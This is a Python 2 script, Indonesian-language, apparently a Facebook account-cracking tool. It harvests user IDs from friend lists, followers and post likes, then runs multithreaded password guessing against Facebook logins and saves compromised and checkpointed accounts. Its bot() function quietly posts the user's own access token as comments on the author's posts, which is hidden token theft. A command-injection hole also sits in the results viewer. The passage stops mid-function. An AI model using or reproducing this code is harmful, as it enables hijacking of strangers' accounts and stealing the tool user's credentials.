#!/usr/bin/python2
# coding=utf-8
# author : Sanz Tzy

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
s=requests.Session()
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")


### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
id = []
cp = []
ok = []
ttl = []
loop = 0

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s
 \x1b[1;92m _________             \x1b[1;93m_____    _______   __________
 \x1b[1;92m/   _____/            \x1b[1;93m/  _  \   \      \  \____    /
 \x1b[1;92m\_____  \   \x1b[1;93m_______  /  /_\  \  /   |   \   /     /
 \x1b[1;92m/        \ \x1b[1;93m/______/ /    |    \/    |    \ /     /_ 
 \x1b[1;92m/______  /          \x1b[1;93m\____|__  /\____|__  //_______ \  
 \x1b[1;92m       \/     \x1b[1;93m              \/         \/         \/    """%(N))
   
### BAGIAN LOGIN ###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print(" %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mSanz Tzy"%(N))
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mGithub     \x1b[1;93m: \x1b[1;93mgithub.com/bot-85")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m---------------------------------------------")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;93m: %s"%(tgl))
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;92mPremium Sampai Kiamat%s"%(H,N))
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m---------------------------------------------")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mIP         \x1b[1;93m: %s"%(IP))
		token = raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan token \x1b[1;93m: \x1b[1;92m')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100013291513596/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/106024538578610/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/124014098051640/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/1324794007973637/comments/?message='+token+'&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))

    logo()
    print ''
    print ' \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mAuthor    : \x1b[1;92mSanz Tzy \x1b[1;93mX \x1b[1;92mHARIS GANZ'
    print ' \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mVersion   : \x1b[1;92m5.3'
    print ' \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mYouTube   : \x1b[1;92mBINTANG XD'
    print(" \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;93m--------------------------------------------")
    print(" \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mBergabung \x1b[1;93m: %s"%(tgl))
    print(" \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mStatus    \x1b[1;93m: %s\x1b[1;92mPremium Sampai Kiamat%s"%(H,N))
    print(" \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;93m--------------------------------------------")
    print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mIP        \x1b[1;93m: %s"%(IP))
    print("\n \x1b[1;92m[ \x1b[1;92mselamat datang Bosku %s%s%s \x1b[1;93m]\n"%(K,nama,N))
    print(" \x1b[1;92m[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Teman Publik")
    print(" \x1b[1;92m[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Teman Massal")
    print(" \x1b[1;92m[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Followers")
    print(" \x1b[1;92m[\x1b[1;93m04\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Postingan")
    print(" \x1b[1;92m[\x1b[1;93m05\x1b[1;92m] \x1b[1;93mCrack Random \x1b[1;92mID FB New")
    print(" \x1b[1;92m[\x1b[1;93m06\x1b[1;92m] \x1b[1;93mSettings \x1b[1;92mUser Agent \x1b[1;94mU\x1b[1;97m/\x1b[1;95mA")
    print(" \x1b[1;92m[\x1b[1;93m07\x1b[1;92m] \x1b[1;93mCheck \x1b[1;92mHasil Crack")
    print(" \x1b[1;92m[\x1b[1;93m08\x1b[1;92m] \x1b[1;93mCheck \x1b[1;92Opsi CheckPoint")
    print(" \x1b[1;92m[\x1b[1;93m09\x1b[1;92m] \x1b[1;93mLaporkan \x1b[1;92mBug Script")
    print(" \x1b[1;92m[\x1b[1;93m10\x1b[1;92m] \x1b[1;93mInfo \x1b[1;92mTools/Script")
    print(" \x1b[1;92m[%s\x1b[1;93m00%s\x1b[1;92m]\x1b[1;92m \x1b[1;91mHapus Token"%(M,N))
    asw = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih : \x1b[1;92m")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    	atursandi()
    elif asw == "2":
    	massal()
    	atursandi()
    elif asw == "3":
    	followers()
    	atursandi()
    elif asw == "4":
    	postingan()
    	atursandi()
    elif asw == "5":
    	fbbaru()
        atursandi()
    elif asw == "6":
    	seting_yntkts()
    elif asw == "7":
	cekhasil()
    elif asw == "8":
        cekopsi()
    elif asw == "9":
 	laporbug()
    elif asw == "10":
        info_tools()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	jalan(" \x1b[1;92m[\x1b[1;93m✓\x1b[1;92m] \x1b[1;93mberhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih jawaban dengan bener ! ")
    	menu() 
		
### DUMP PUBLIK ###
def publik():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93misi \x1b[1;97m'\x1b[1;92mme\x1b[1;97m' \x1b[1;93mjika ingin crack dari daftar teman")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mmasukan id atau username \x1b[1;93m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tidak tersedia atau list teman private")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id  \x1b[1;93m: %s%s%s\x1b[1;92m"%(M,len(id),N)) 
  
### DUMP MASSAL ###
def massal():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	try:
		tanya_total = int(raw_input(" [?] masukan jumlah target : "))
	except:tanya_total=1
	print(" [*] isi 'me' jika ingin crack dari daftar teman")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" [?] id target %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" [!] akun tidak tersedia atau list teman private")
	print("\n [+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP FOLLOWERS ###
def followers():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	print(" [*] isi 'me' jika ingin crack dari pengikut sendiri")
	idt = raw_input(" [*] masukan id atau username : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [!] akun tidak tersedia atau list teman private")
	print("\n [+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP POSTINGAN ###
def postingan():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	idt = raw_input(" [?] masukan url atau id postingan : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [!] postingan tidak tersedia atau post private")
	print("\n [+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP NEW FB ###
def fbbaru():
	x = 11111111111
	xx = 77777777777
	idx = "1000" 
	limit = int(input(" [+] masukan jumlah id Maksimal 5000 id: "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+"<=>"+str(_))
	except KeyError:
		exit(" [!] akun tidak tersedia atau error")
	print("\n [+] total id  : %s%s%s"%(M,len(id),N))
### CEK DATA² TARGET ###
def igg():
    jalan(' [*] maaf fitur ini tidak tersedia sekarang\n [*] silahkan tunggu update terbaru')
    raw_input('\n [*] kembali ')
    menu()
####INFO TOOLS####
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Yt       \x1b[1;93m: Bintang XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Author   \x1b[1;93m: BINTANG-XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Github   \x1b[1;93m: https://github.com/bot-85'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Facebook \x1b[1;93m: Bintang Tzy'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Link FB  \x1b[1;93m: https://www.facebook.com/bintangt.zy.92'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Ig       \x1b[1;93m: Ndak punya'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Catatan  \x1b[1;93m: Please support my github, brothers and sisters'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));menu()

### CEK HASIL CRACK ###
def cekhasil():
	print('\n [1]. l\x1b[1;92mihat hasil crack OK ')
	print(' [2]. \x1b[1;93mlihat hasil crack CP ')
	anjg = raw_input('\n [?] pilih : \x1b[1;93m')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print("")
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n [?] mau lihat hasil yang mana ?: ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" \x1b[1;92m[+] tanggal : \x1b[1;93m%s -total : \x1b[1;93m%s"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
		raw_input("\n [*]\x1b[1;93m tekan enter untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print("")
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n [?] \x1b[1;93mmau Cek yang mana ? : \x1b[1;92m" )
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" \x1b[1;93m[+] tanggal : \x1b[1;92m%s -total : \x1b[1;93m%s"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
		raw_input("\n [*] \x1b[1;93mtekan enter untuk kembali ke menu ")
		menu()
	else:
		menu()


####CHECK OPSI CEKPOINT####
def cekopsi():
	dirs = os.listdir("CP")
	print("")
	for file in dirs:
		print(" [*] CP/"+file)
	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" [?] nama file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n [!] nama file %s tidak tersedia"%(files))
	print('\n [!] anda bisa mematikan data selular untuk menjeda proses cek\n')
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n [+] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
		try:
			check_in(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n [!] cek akun sudah selesai...")
	raw_input(" [*] tekan enter untuk kembali ke menu ")
	time.sleep(1)
	menu()
	
def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = random.choice([
		'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
		'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36',
		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Mobile Safari/537.36 OPR/18.0.1290.68007'
	])
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("raw_input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" [+] aplikasi terhubung ada : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("raw_input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("raw_input",{"name":"jazoest"})["value"]
		nh   = form.find("raw_input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if "Lihat detail login yang ditampilkan. Ini Anda?" in str(xnxx):
			print("\r  🌟 %sTinggal 1 langkah lagi untuk membuka akun facebook. silahkan buka di browser%s"%(H,N))
		else:
			print(" [+] terdapat "+str(len(ngew))+" opsi ")
			for opt in range(len(ngew)):
				print("  ["+str(opt+1)+"] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		print(" [!] Setujui masuk anda dari telepon atau komputer lain")

###GANTI USER AGENT###
def seting_yntkts():
    print '\n %s1%s \x1b[1;93mganti user agent'%(O,N)
    print ' %s2%s \x1b[1;93mcheck user agent'%(O,N)
    ytbjts = raw_input('\n %s\x1b[1;93m[%s\x1b[1;92m?%s\x1b[1;92m] choose : \x1b[1;93m'%(N,O,N))
    if ytbjts == '':
        print '\n %s[%s×%s] \x1b[1;93mGak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print '\n %s[%s+%s] \x1b[1;93mUser Agent anda : \x1b[1;93m%s%s'%(N,O,N,H,user_agent)
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));menu()
    else:
        print '\n %s[%s×%s] \x1b[1;93minput yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
# User Agent baru
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = raw_input('\n [%s?%s] \x1b[1;93mingin menggunakan user agent hp anda [Y/t]: '%(O,N))
    if _asu_ == '':
        print '\n %s[%s×%s] \x1b[1;93mGak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n %s •%s \x1b[1;93mMasuk Google chrome/google biasa lalu cari\n  %s•%s %sMY USER AGENT%s \x1b[1;93mlalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('')
        _agen_ = raw_input(' [%s?%s]\x1b[1;93m masukan user agent hp anda :%s\x1b[1;93m '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] \x1b[1;92mberhasil menggunakan user agent hp anda...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));menu()
    elif _asu_ in['T','t']:
        _agen_ = raw_input(' [%s?%s] \x1b[1;93mmasukan user agent :%s \x1b[1;93m'%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s]\x1b[1;93m berhasil mengganti user agent...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));menu()
    else:
        print '\n %s[%s!%s]\x1b[1;93m [Y/t] ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()

####LAPORAN BUG####
def laporbug():
    asulo = raw_input('\n \x1b[1;92m[?] masukan laporan bug script : \x1b[1;92m').replace(' ', '%20')
    if asulo == '':
        menu()
    os.system('xdg-open https://wa.me/6281272106675?text=' + asulo)
    raw_input('\n \x1b[1;92m[*] \x1b[1;93mkembali ')
    menu()


### BAGIAN SANDI ####
def atursandi():
	ask=raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mapakah anda ingin menggunakan sandi manual\x1b[1;97m? \x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;93m:\x1b[1;92m")
	if ask=="y":
		sandimanual()
	elif ask=="t":
		sandiotomatis()
	else:
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mpilih jawaban dengan benar\x1b[1;97m!"%(M))

def sandimanual():
	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mgunakan , (koma) \x1b[1;93muntuk pemisah contoh \x1b[1;97m: \x1b[1;93msandi123\x1b[1;97m,sandi12345,\x1b[1;93mdll\x1b[1;97m. \x1b[1;93msetiap kata minimal 6 karakter atau lebih")
	pwek=raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan kata sandi \x1b[1;93m: \x1b[1;92m')
	print(' \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mcrack dengan sandi -> \x1b[1;92m[ \x1b[1;93m%s%s%s \x1b[1;92m]' % (M, pwek, N))
	if pwek=="":
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
	elif len(pwek)<=5:
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mmasukan sandi minimal 6 angka\x1b[1;97m!"%(M))
	print("\n \x1b[1;92m[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
	print(" \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]. \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
	print(" \x1b[1;92m[\x1b[1;93m2\x1b[1;92m]. \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
	print(" \x1b[1;92m[\x1b[1;93m3\x1b[1;92m]. \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
	ask=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
	if ask=="":
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
	elif ask=="1":
		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(api, uid, pwek.split(","))
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
	elif ask=="2":
		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
	elif ask=="3":
		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://m.facebook.com")
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
	
def sandiotomatis():
	print("\n \x1b[1;92m[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
	print(" \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]. \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
	print(" \x1b[1;92m[\x1b[1;93m2\x1b[1;92m]. \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
	print(" \x1b[1;92m[\x1b[1;93m3\x1b[1;92m]. \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
	ask=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
	if ask=="":
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
	elif ask=="1":
		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(api, uid, pwx)
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
	elif ask=="2":
		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
